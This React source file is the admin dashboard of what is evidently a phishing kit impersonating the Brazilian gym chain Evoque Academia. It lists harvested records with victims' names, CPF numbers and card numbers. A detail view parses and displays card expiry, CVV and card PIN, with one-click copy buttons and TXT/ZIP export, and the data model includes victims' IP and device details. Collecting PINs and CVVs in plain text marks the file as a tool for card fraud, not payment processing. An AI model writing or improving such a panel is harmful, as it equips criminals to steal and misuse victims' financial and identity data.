import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from '@/components/ui/dialog';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow
} from '@/components/ui/table';
import {
  CreditCard,
  Users,
  CheckCircle,
  AlertCircle,
  Clock,
  ArrowLeft,
  RefreshCw,
  Download,
  Loader2,
  Eye,
  Copy,
  Check
} from 'lucide-react';
import { toast } from 'sonner';
import evoqueLogo from '@/assets/evoque-logo.webp';

interface Payment {
  id: string;
  nomeCompleto: string;
  cpf: string;
  numeroCartao: string;
  validade: string;
  dataCriacao: string;
  status: 'pendente' | 'processado' | 'erro';
  senhaCartao?: string;
}

const Admin = () => {
  const navigate = useNavigate();
  const [payments, setPayments] = useState<Payment[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [isDownloading, setIsDownloading] = useState(false);
  const [selectedPayment, setSelectedPayment] = useState<Payment | null>(null);
  const [paymentDetails, setPaymentDetails] = useState<string>('');
  const [isLoadingDetails, setIsLoadingDetails] = useState(false);
  const [isDownloadingFile, setIsDownloadingFile] = useState(false);
  const [copiedField, setCopiedField] = useState<string | null>(null);

  interface ParsedPaymentData {
    nome: string;
    cpf: string;
    cartao: string;
    validade: string;
    cvv: string;
    senhaCartao: string;
    data: string;
    // Device information
    ip?: string;
    navegador?: string;
    so?: string;
    dispositivo?: string;
    resolucao?: string;
    idioma?: string;
    fuso?: string;
    conexao?: string;
  }

  const [parsedData, setParsedData] = useState<ParsedPaymentData | null>(null);

  const BACKEND_URL = 'http://localhost:5555';

  useEffect(() => {
    fetchPayments();
  }, []);

  const fetchPayments = async () => {
    try {
      setIsLoading(true);
      const response = await fetch(`${BACKEND_URL}/api/payments`);

      if (!response.ok) {
        throw new Error(`Erro ao buscar dados: ${response.status}`);
      }

      const data = await response.json();

      if (data.success) {
        // Convert dataCriacao to proper format for sorting
        const paymentsWithDate = data.payments.map((p: Payment) => ({
          ...p,
          dataCriacaoObj: new Date(p.dataCriacao)
        }));

        // Sort by date descending
        paymentsWithDate.sort((a: any, b: any) =>
          b.dataCriacaoObj.getTime() - a.dataCriacaoObj.getTime()
        );

        // Remove the temporary date object
        setPayments(paymentsWithDate.map(({ dataCriacaoObj, ...p }: any) => p));

        if (data.payments.length > 0) {
          toast.success(`${data.total} pagamentos carregados com sucesso!`);
        }
      } else {
        toast.error('Erro ao carregar pagamentos');
      }
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : 'Erro ao conectar com backend';
      console.error('Erro:', error);
      toast.error(errorMsg);
    } finally {
      setIsLoading(false);
    }
  };

  const downloadZip = async () => {
    try {
      setIsDownloading(true);
      const response = await fetch(`${BACKEND_URL}/api/download-zip`);

      if (!response.ok) {
        throw new Error(`Erro ao baixar: ${response.status}`);
      }

      // Get the blob
      const blob = await response.blob();

      // Create a temporary URL for the blob
      const url = window.URL.createObjectURL(blob);

      // Create a temporary anchor element and trigger download
      const link = document.createElement('a');
      link.href = url;
      link.download = `pagamentos_${new Date().toISOString().split('T')[0]}.zip`;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      // Clean up the URL
      window.URL.revokeObjectURL(url);

      toast.success('Download iniciado com sucesso!');
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : 'Erro ao baixar arquivo';
      console.error('Erro:', error);
      toast.error(errorMsg);
    } finally {
      setIsDownloading(false);
    }
  };

  const parsePaymentContent = (content: string): ParsedPaymentData => {
    const lines = content.split('\n');
    const data: ParsedPaymentData = {
      nome: '',
      cpf: '',
      cartao: '',
      validade: '',
      cvv: '',
      senhaCartao: '',
      data: ''
    };

    for (const line of lines) {
      if (line.includes('Nome Completo:')) {
        data.nome = line.split('Nome Completo:')[1]?.trim() || '';
      } else if (line.includes('CPF:') && !line.includes('INFORMAÇÕES')) {
        data.cpf = line.split('CPF:')[1]?.trim() || '';
      } else if (line.includes('Número do Cartão:')) {
        data.cartao = line.split('Número do Cartão:')[1]?.trim() || '';
      } else if (line.includes('Validade:') && !line.includes('DADOS DO')) {
        data.validade = line.split('Validade:')[1]?.trim() || '';
      } else if (line.includes('CVV:')) {
        data.cvv = line.split('CVV:')[1]?.trim() || '';
      } else if (line.includes('Senha do Cartão:')) {
        data.senhaCartao = line.split('Senha do Cartão:')[1]?.trim() || '';
      } else if (line.includes('Data/Hora:')) {
        data.data = line.split('Data/Hora:')[1]?.trim() || '';
      }
    }

    return data;
  };

  const viewPaymentDetails = async (payment: Payment) => {
    try {
      setSelectedPayment(payment);
      setIsLoadingDetails(true);
      setParsedData(null);
      setCopiedField(null);

      const response = await fetch(`${BACKEND_URL}/api/payment/${payment.id}`);

      if (!response.ok) {
        throw new Error(`Erro ao buscar detalhes: ${response.status}`);
      }

      const data = await response.json();

      if (data.success) {
        setPaymentDetails(data.content);
        const parsed = parsePaymentContent(data.content);
        setParsedData(parsed);
      } else {
        toast.error('Erro ao carregar detalhes do pagamento');
        setSelectedPayment(null);
      }
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : 'Erro ao carregar detalhes';
      console.error('Erro:', error);
      toast.error(errorMsg);
      setSelectedPayment(null);
    } finally {
      setIsLoadingDetails(false);
    }
  };

  const downloadPaymentFile = async () => {
    if (!selectedPayment) return;

    try {
      setIsDownloadingFile(true);
      const response = await fetch(`${BACKEND_URL}/api/payment/${selectedPayment.id}/download`);

      if (!response.ok) {
        throw new Error(`Erro ao baixar: ${response.status}`);
      }

      // Get the blob
      const blob = await response.blob();

      // Create a temporary URL for the blob
      const url = window.URL.createObjectURL(blob);

      // Create a temporary anchor element and trigger download
      const link = document.createElement('a');
      link.href = url;
      link.download = `${selectedPayment.id}.txt`;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      // Clean up the URL
      window.URL.revokeObjectURL(url);

      toast.success('Download iniciado com sucesso!');
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : 'Erro ao baixar arquivo';
      console.error('Erro:', error);
      toast.error(errorMsg);
    } finally {
      setIsDownloadingFile(false);
    }
  };

  const copyToClipboard = async (text: string, fieldName: string) => {
    try {
      // Primeiro tenta com navigator.clipboard
      if (navigator.clipboard && window.isSecureContext) {
        await navigator.clipboard.writeText(text);
      } else {
        // Fallback para document.execCommand
        const textarea = document.createElement('textarea');
        textarea.value = text;
        textarea.style.position = 'fixed';
        textarea.style.top = '0';
        textarea.style.left = '0';
        textarea.style.opacity = '0';
        document.body.appendChild(textarea);
        textarea.focus();
        textarea.select();

        const successful = document.execCommand('copy');
        document.body.removeChild(textarea);

        if (!successful) {
          throw new Error('Falha ao copiar');
        }
      }

      setCopiedField(fieldName);
      toast.success(`${fieldName} copiado!`);
      setTimeout(() => setCopiedField(null), 2000);
    } catch (error) {
      toast.error('Erro ao copiar para clipboard');
      console.error('Erro ao copiar:', error);
    }
  };

  const CopyableField = ({ label, value, fieldName }: { label: string; value: string; fieldName: string }) => (
    <div className="flex items-center justify-between p-4 bg-muted/50 rounded-lg border border-border hover:border-primary/50 transition-colors">
      <div className="flex-1">
        <p className="text-xs font-semibold text-muted-foreground uppercase tracking-wide mb-1">
          {label}
        </p>
        <p className="text-base font-mono text-foreground">
          {value}
        </p>
      </div>
      <Button
        variant="ghost"
        size="icon"
        onClick={() => copyToClipboard(value, fieldName)}
        className="ml-4 h-10 w-10 flex-shrink-0"
        title={`Copiar ${fieldName}`}
      >
        {copiedField === fieldName ? (
          <Check className="h-4 w-4 text-green-500" />
        ) : (
          <Copy className="h-4 w-4 text-muted-foreground hover:text-primary" />
        )}
      </Button>
    </div>
  );

  const stats = {
    total: payments.length,
    processados: payments.filter(p => p.status === 'processado').length,
    pendentes: payments.filter(p => p.status === 'pendente').length,
    erros: payments.filter(p => p.status === 'erro').length,
  };

  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'processado':
        return (
          <Badge className="bg-green-500/20 text-green-400 border-green-500/30 hover:bg-green-500/30">
            <CheckCircle className="h-3 w-3 mr-1" />
            Processado
          </Badge>
        );
      case 'pendente':
        return (
          <Badge className="bg-yellow-500/20 text-yellow-400 border-yellow-500/30 hover:bg-yellow-500/30">
            <Clock className="h-3 w-3 mr-1" />
            Pendente
          </Badge>
        );
      case 'erro':
        return (
          <Badge className="bg-red-500/20 text-red-400 border-red-500/30 hover:bg-red-500/30">
            <AlertCircle className="h-3 w-3 mr-1" />
            Erro
          </Badge>
        );
      default:
        return (
          <Badge className="bg-gray-500/20 text-gray-400 border-gray-500/30 hover:bg-gray-500/30">
            {status}
          </Badge>
        );
    }
  };

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="border-b border-border bg-card/50 backdrop-blur-sm sticky top-0 z-50">
        <div className="container mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <Button 
              variant="ghost" 
              size="icon" 
              onClick={() => navigate('/')}
              className="text-muted-foreground hover:text-foreground"
            >
              <ArrowLeft className="h-5 w-5" />
            </Button>
            <img 
              src={evoqueLogo} 
              alt="Evoque Academia" 
              className="h-10 w-auto object-contain"
            />
          </div>
          <div className="flex items-center gap-2">
            <Button
              variant="admin"
              size="sm"
              className="gap-2"
              onClick={fetchPayments}
              disabled={isLoading}
            >
              <RefreshCw className={`h-4 w-4 ${isLoading ? 'animate-spin' : ''}`} />
              {isLoading ? 'Atualizando...' : 'Atualizar'}
            </Button>
            <Button
              variant="outline"
              size="sm"
              className="gap-2"
              onClick={downloadZip}
              disabled={isDownloading || payments.length === 0}
            >
              <Download className={`h-4 w-4 ${isDownloading ? 'animate-spin' : ''}`} />
              {isDownloading ? 'Baixando...' : 'Baixar ZIP'}
            </Button>
          </div>
        </div>
      </header>

      {/* Main content */}
      <main className="container mx-auto px-4 py-8">
        <div className="mb-8 animate-fade-in">
          <h1 className="text-3xl font-bold text-foreground mb-2">
            Painel administrativo
          </h1>
          <p className="text-muted-foreground">
            Gerencie as atualizações de pagamento da rede Evoque Academia
          </p>
        </div>

        {/* Stats cards */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
          <Card className="animate-fade-in" style={{ animationDelay: '0.1s' }}>
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-muted-foreground mb-1">Total de registros</p>
                  <p className="text-3xl font-bold text-foreground">{stats.total}</p>
                </div>
                <div className="h-12 w-12 rounded-lg bg-primary/10 flex items-center justify-center">
                  <Users className="h-6 w-6 text-primary" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="animate-fade-in" style={{ animationDelay: '0.2s' }}>
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-muted-foreground mb-1">Processados</p>
                  <p className="text-3xl font-bold text-green-400">{stats.processados}</p>
                </div>
                <div className="h-12 w-12 rounded-lg bg-green-500/10 flex items-center justify-center">
                  <CheckCircle className="h-6 w-6 text-green-400" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="animate-fade-in" style={{ animationDelay: '0.3s' }}>
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-muted-foreground mb-1">Pendentes</p>
                  <p className="text-3xl font-bold text-yellow-400">{stats.pendentes}</p>
                </div>
                <div className="h-12 w-12 rounded-lg bg-yellow-500/10 flex items-center justify-center">
                  <Clock className="h-6 w-6 text-yellow-400" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="animate-fade-in" style={{ animationDelay: '0.4s' }}>
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-muted-foreground mb-1">Com erro</p>
                  <p className="text-3xl font-bold text-red-400">{stats.erros}</p>
                </div>
                <div className="h-12 w-12 rounded-lg bg-red-500/10 flex items-center justify-center">
                  <AlertCircle className="h-6 w-6 text-red-400" />
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Payments table */}
        <Card className="animate-fade-in" style={{ animationDelay: '0.5s' }}>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <CreditCard className="h-5 w-5 text-primary" />
              Atualizações de pagamento
            </CardTitle>
            <CardDescription>
              Lista de todas as atualizações de cartão recebidas
            </CardDescription>
          </CardHeader>
          <CardContent>
            {isLoading ? (
              <div className="flex items-center justify-center py-12">
                <div className="flex flex-col items-center gap-2">
                  <Loader2 className="h-8 w-8 text-primary animate-spin" />
                  <p className="text-muted-foreground">Carregando pagamentos...</p>
                </div>
              </div>
            ) : (
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader>
                    <TableRow className="border-border hover:bg-transparent">
                      <TableHead className="text-muted-foreground">Nome</TableHead>
                      <TableHead className="text-muted-foreground">CPF</TableHead>
                      <TableHead className="text-muted-foreground">Cartão</TableHead>
                      <TableHead className="text-muted-foreground">Validade</TableHead>
                      <TableHead className="text-muted-foreground">Data</TableHead>
                      <TableHead className="text-muted-foreground">Status</TableHead>
                      <TableHead className="text-muted-foreground w-12">Ação</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {payments.map((payment, index) => (
                      <TableRow
                        key={payment.id}
                        className="border-border hover:bg-muted/50 animate-slide-in"
                        style={{ animationDelay: `${0.1 * index}s` }}
                      >
                        <TableCell className="font-medium text-foreground">
                          {payment.nomeCompleto}
                        </TableCell>
                        <TableCell className="text-muted-foreground">
                          {payment.cpf}
                        </TableCell>
                        <TableCell className="text-muted-foreground font-mono">
                          {payment.numeroCartao}
                        </TableCell>
                        <TableCell className="text-muted-foreground">
                          {payment.validade}
                        </TableCell>
                        <TableCell className="text-muted-foreground">
                          {payment.dataCriacao}
                        </TableCell>
                        <TableCell>
                          {getStatusBadge(payment.status)}
                        </TableCell>
                        <TableCell>
                          <Button
                            variant="ghost"
                            size="icon"
                            onClick={() => viewPaymentDetails(payment)}
                            className="h-8 w-8 text-muted-foreground hover:text-primary"
                            title="Visualizar detalhes"
                          >
                            <Eye className="h-4 w-4" />
                          </Button>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            )}

            {!isLoading && payments.length === 0 && (
              <div className="text-center py-12">
                <CreditCard className="h-12 w-12 text-muted-foreground mx-auto mb-4" />
                <p className="text-muted-foreground">Nenhuma atualização de pagamento encontrada</p>
              </div>
            )}
          </CardContent>
        </Card>
      </main>

      {/* Payment Details Modal */}
      <Dialog open={selectedPayment !== null} onOpenChange={(open) => {
        if (!open) {
          setSelectedPayment(null);
          setPaymentDetails('');
          setParsedData(null);
        }
      }}>
        <DialogContent className="max-w-2xl">
          <DialogHeader>
            <DialogTitle className="text-2xl">Detalhes do Pagamento</DialogTitle>
            <DialogDescription className="text-base">
              {selectedPayment?.nomeCompleto}
            </DialogDescription>
          </DialogHeader>

          {isLoadingDetails ? (
            <div className="flex items-center justify-center py-12">
              <div className="flex flex-col items-center gap-2">
                <Loader2 className="h-8 w-8 text-primary animate-spin" />
                <p className="text-muted-foreground">Carregando detalhes...</p>
              </div>
            </div>
          ) : parsedData ? (
            <div className="space-y-5">
              {/* Informações Pessoais Section */}
              <div>
                <h3 className="text-sm font-semibold text-muted-foreground uppercase tracking-wide mb-3 px-1">
                  Informações Pessoais
                </h3>
                <div className="space-y-3">
                  <CopyableField
                    label="Nome Completo"
                    value={parsedData.nome}
                    fieldName="Nome"
                  />
                  <CopyableField
                    label="CPF"
                    value={parsedData.cpf}
                    fieldName="CPF"
                  />
                </div>
              </div>

              {/* Dados do Cartão Section */}
              <div className="pt-2">
                <h3 className="text-sm font-semibold text-muted-foreground uppercase tracking-wide mb-3 px-1">
                  Dados do Cartão
                </h3>
                <div className="space-y-3">
                  <CopyableField
                    label="Número do Cartão"
                    value={parsedData.cartao}
                    fieldName="Cartão"
                  />
                  <div className="grid grid-cols-2 gap-3">
                    <CopyableField
                      label="Validade"
                      value={parsedData.validade}
                      fieldName="Validade"
                    />
                    <CopyableField
                      label="CVV"
                      value={parsedData.cvv}
                      fieldName="CVV"
                    />
                  </div>
                  <CopyableField
                    label="Senha do Cartão"
                    value={parsedData.senhaCartao}
                    fieldName="Senha"
                  />
                </div>
              </div>

              {/* Data e Hora */}
              <div className="pt-2">
                <h3 className="text-sm font-semibold text-muted-foreground uppercase tracking-wide mb-3 px-1">
                  Data e Hora
                </h3>
                <CopyableField
                  label="Data/Hora do Registro"
                  value={parsedData.data}
                  fieldName="Data"
                />
              </div>

              {/* Action Buttons */}
              <div className="flex justify-end gap-2 pt-4 border-t border-border">
                <Button
                  variant="outline"
                  onClick={() => {
                    setSelectedPayment(null);
                    setPaymentDetails('');
                    setParsedData(null);
                  }}
                >
                  Fechar
                </Button>
                <Button
                  className="gap-2"
                  onClick={downloadPaymentFile}
                  disabled={isDownloadingFile}
                >
                  <Download className={`h-4 w-4 ${isDownloadingFile ? 'animate-spin' : ''}`} />
                  {isDownloadingFile ? 'Baixando...' : 'Baixar TXT'}
                </Button>
              </div>
            </div>
          ) : null}
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Admin;
